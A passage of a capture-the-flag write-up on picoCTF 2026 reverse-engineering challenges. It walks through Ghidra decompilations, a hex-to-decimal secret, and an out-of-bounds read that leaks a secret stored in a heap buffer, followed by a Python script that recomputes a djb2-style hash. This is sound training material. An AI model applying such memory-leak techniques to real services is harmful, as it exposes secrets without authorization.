![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FrWmaNSBHc9B4dfveMjEX%252FScreenshot%2520%281805%29.png%3Falt%3Dmedia%26token%3D50fd5ced-d5be-4c09-b2bf-f346d4aa688f&width=768&dpr=3&quality=100&sign=a67fb34&sv=2)

As you can see, this is the same output in the server also, asking for the secret. Now let's disassemble the binary using `Ghidra`

Here's the `main` function:

```c
undefined8 main(void)

{
  int local_10;
  int local_c;
  
  local_c = 0x84d7e4f;
  local_10 = 0;
  puts("What\'s the secret?");
  __isoc99_scanf(&DAT_00402023,&local_10);
  if (local_c == local_10) {
    puts("Correct!");
  }
  else {
    puts("Nice try :(");
  }
  return 0;
}
```

The program compares our input (`local_10`) against a hardcoded value (`local_c`). To pass the `if` statement, we simply need to convert that hex value into a standard decimal integer.

Hexadecimal: `0x84d7e4f`

Decimal Calculation: $(8 \times 16^6) + (4 \times 16^5) + (13 \times 16^4) + (7 \times 16^3) + (14 \times 16^2) + (4 \times 16^1) + (15 \times 16^0)$

Decimal Value: `139,296,335`

Now let's try it:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FIkh6Z05JRpmkUBpOG2Ko%252FScreenshot%2520%281807%29.png%3Falt%3Dmedia%26token%3D85a97412-0fdd-4130-9474-f25175e680ab&width=768&dpr=3&quality=100&sign=ac071c11&sv=2)

I attempted to connect to the server again, and the binary was different this time, but I observed something interesting.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fvvb28cS9z3JXSJa0v22L%252FScreenshot%2520%281808%29.png%3Falt%3Dmedia%26token%3Da75dfac3-7b49-4d5c-bfe9-45126180635a&width=768&dpr=3&quality=100&sign=3948ad6b&sv=2)

Take a closer look at this, if you will read the welcoming message, it is mentioned that it's **20 binaries**, and below is a sequence of numbers that is matched on the length of the `secret` , so I attempt to use this as the `secret` and here's what happened:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FIGd4Lpo4rZGiJWwYcBWj%252FScreenshot%2520%281809%29.png%3Falt%3Dmedia%26token%3Df60fb51b-d26a-46c2-8578-20c590f7852a&width=768&dpr=3&quality=100&sign=8130008c&sv=2)

I reconnected to the server, which caused the secret to change, and when I entered it, it revealed a new secret. Basically, it’s a race, you have to submit the secret quickly, or the challenge resets from the beginning. And I guess we need to do this 20 times in a row to get the flag.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FdDhmWznx9MqmVQi7zTL2%252FScreenshot%2520%281811%29.png%3Falt%3Dmedia%26token%3De682f81c-65d4-42a3-9eae-f5a555f3833d&width=768&dpr=3&quality=100&sign=d2685e18&sv=2)

And after 20 inputs of secrets, we've got the flag!

## Secure Password Database - 200pts

For this challenge, we are given a file called `system.out` and a server that we can connect with using `netcat`

When we execute the binary, this is the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhTrXbxlyav0aJy43PQ98%252FScreenshot%2520%281812%29.png%3Falt%3Dmedia%26token%3Dffeece62-612d-479d-b86b-f43091a61dd5&width=768&dpr=3&quality=100&sign=ee256824&sv=2)

Now as you can see, it's asking for a password and the bytes in length? Interesting, let's disassemble it using `Ghidra`

Here's the `main` function:

```c
undefined8 main(void)

{
  uint uVar1;
  char *pcVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  int local_128;
  char *local_120;
  ulong local_118;
  char *local_110;
  size_t local_108;
  ulong local_100;
  ulong local_f8;
  FILE *local_f0;
  undefined1 local_e5 [13];
  char local_d8 [31];
  char acStack_b9 [65];
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_110 = (char *)calloc(0x5a,1);
  for (local_118 = 0; local_118 < 0xd; local_118 = local_118 + 1) {
    local_110[local_118 + 0x3c] = obf_bytes[local_118] ^ 0xaa;
  }
  puts("Please set a password for your account:");
  pcVar2 = fgets(acStack_b9 + 1,0x32,stdin);
  if (pcVar2 != (char *)0x0) {
    strcpy(local_110,acStack_b9 + 1);
    puts("How many bytes in length is your password?");
    pcVar2 = fgets(local_d8,0x14,stdin);
    if (pcVar2 != (char *)0x0) {
      uVar1 = atoi(local_d8);
      printf("You entered: %d\n",(ulong)uVar1);
      puts("Your successfully stored password:");
      for (local_128 = 0; (local_128 <= (int)uVar1 && (local_128 < 0x5a)); local_128 = local_128 + 1
          ) {
        printf("%d ",(ulong)(uint)(int)local_110[local_128]);
      }
      putchar(10);
    }
  }
  puts("Enter your hash to access your account!");
  pcVar2 = fgets(acStack_b9 + 1,0x32,stdin);
  if (pcVar2 != (char *)0x0) {
    local_108 = strlen(acStack_b9 + 1);
    if ((local_108 != 0) && (acStack_b9[local_108] == '\n')) {
      acStack_b9[local_108] = '\0';
    }
    local_100 = strtoul(acStack_b9 + 1,&local_120,10);
    if (local_120 == acStack_b9 + 1) {
      printf("No digits were found");
                    /* WARNING: Subroutine does not return */
      __assert_fail("1 == 0","heartbleed.c",0x45,"main");
    }
    local_f8 = make_secret(local_e5);
    if (local_f8 == local_100) {
      local_f0 = fopen("flag.txt","r");
      if (local_f0 == (FILE *)0x0) {
        perror("Could not open flag.txt");
        uVar3 = 1;
        goto LAB_0010173e;
      }
      pcVar2 = fgets(local_78,100,local_f0);
      if (pcVar2 == (char *)0x0) {
        puts("Failed to read the flag");
      }
      else {
        printf("%s",local_78);
      }
      fclose(local_f0);
    }
  }
  free(local_110);
  uVar3 = 0;
LAB_0010173e:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

Here's the `hash` function:

```c
long hash(byte *param_1)

{
  byte *local_20;
  long local_10;
  
  local_10 = 0x1505;
  local_20 = param_1;
  while( true ) {
    if (*local_20 == 0) break;
    local_10 = (long)(int)(uint)*local_20 + local_10 * 0x21;
    local_20 = local_20 + 1;
  }
  return local_10;
}
```

Here's the `make_secret` function:

```c
void make_secret(long param_1)

{
  long local_10;
  
  for (local_10 = 0; obf_bytes[local_10] != '\0'; local_10 = local_10 + 1) {
    *(byte *)(local_10 + param_1) = obf_bytes[local_10] ^ 0xaa;
  }
  *(undefined1 *)(param_1 + 0xc) = 0;
  hash(param_1);
  return;
}
```

This challenge is a classic "Heartbleed" style vulnerability. The core of the exploit lies in an out-of-bounds read (Information Leak) that allows you to see data in the program's memory that you aren't supposed to see—specifically, the secret bytes needed to calculate the required hash.

1. The Vulnerability: **Out-of-Bounds Read**

In the `main` function, look at how the program displays our "stored password":

```c
puts("How many bytes in length is your password?");
pcVar2 = fgets(local_d8,0x14,stdin);
uVar1 = atoi(local_d8); // We control this value!
...
for (local_128 = 0; (local_128 <= (int)uVar1 && (local_128 < 0x5a)); local_128 = local_128 + 1) {
    printf("%d ",(ulong)(uint)(int)local_110[local_128]);
}
```

The program asks us how many bytes to print. It doesn't check if the number we provide actually matches the length of the password we've entered. It only caps it at `0x5a` (90 bytes).

1. The Target: **The Secret String**

In `main`, the program prepares a secret inside the `local_110` buffer:

```c
local_110 = (char *)calloc(0x5a,1);
for (local_118 = 0; local_118 < 0xd; local_118 = local_118 + 1) {
    local_110[local_118 + 0x3c] = obf_bytes[local_118] ^ 0xaa;
}
```

* It allocates 90 (`0x5a`) bytes.
* It places a "secret" (the XORed `obf_bytes`) starting at offset `0x3c` (60 in decimal).

1. **The Plan**

* **Leak the Secret**: When asked for the length, enter 90. This will force the program to print 90 bytes of memory. Since the secret is stored at offset 60, it will be printed out as a series of integers.
* **Identify the Secret**: Look for the numbers starting from the 61st position in the output. These are the ASCII values of the secret string.
* **Calculate the Hash**: The `make_secret` function calls `hash()` on this leaked string. We need to replicate that hash function locally to get the final number.

Now let's solve it!

Let's connect to the server and enter our password and set `90` for the length.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5XSsM09w5DAirLFyqqZO%252FScreenshot%2520%281813%29.png%3Falt%3Dmedia%26token%3D9ec3dee1-19e2-4e5c-a805-c315703ba193&width=768&dpr=3&quality=100&sign=68bcc31&sv=2)

The next thing that we will do is to replicated the hash, the hash function is a variation of the `djb2` algorithm:

$$
\text{hash} = (\text{hash} \times 33) + \text{char\_value}
$$

Starting with an initial value of `0x1505` (5381).

Looking at our output, the "secret" starts after all those zeros. The bytes we need are: `105, 85, 98, 104, 56, 49, 33, 106, 42, 104, 110, 33`

(The `-86` is just the signed representation of the XOR padding/null terminator, and the `0`s follow it, so we stop there).

Here's the Python script I've made to get the hash:

```python
def get_hash(bytes_list):
    h = 5381  # 0x1505
    for b in bytes_list:
        # We use & 0xFFFFFFFFFFFFFFFF to simulate 64-bit unsigned long overflow
        h = ((h * 33) + b) & 0xFFFFFFFFFFFFFFFF
    return h
    
secret_bytes = [105, 85, 98, 104, 56, 49, 33, 106, 42, 104, 110, 33]

print(f"Your hash is: {get_hash(secret_bytes)}")
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGtPBA5nj5ffGHk4rKyHF%252FScreenshot%2520%281817%29.png%3Falt%3Dmedia%26token%3D683493cf-83fd-49f2-94ac-a70db24c0745&width=768&dpr=3&quality=100&sign=d8bd073f&sv=2)

Now that we've got the hash, let's enter this as the hash value in the server:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGcr9FVISyrdP0gYqA3aU%252FScreenshot%2520%281816%29.png%3Falt%3Dmedia%26token%3D11fc0a52-20a1-4e78-88cf-ebee177a3ace&width=768&dpr=3&quality=100&sign=f5e47754&sv=2)

And there it is!

And that’s all I managed to clear in the **Reverse Engineering** section of picoCTF 2026. Some of these challenges were tricky, some just fun brain teasers, but each one was a good reminder of why I love RE—digging into binaries, spotting patterns, and figuring out what’s really going on under the hoodsz:>
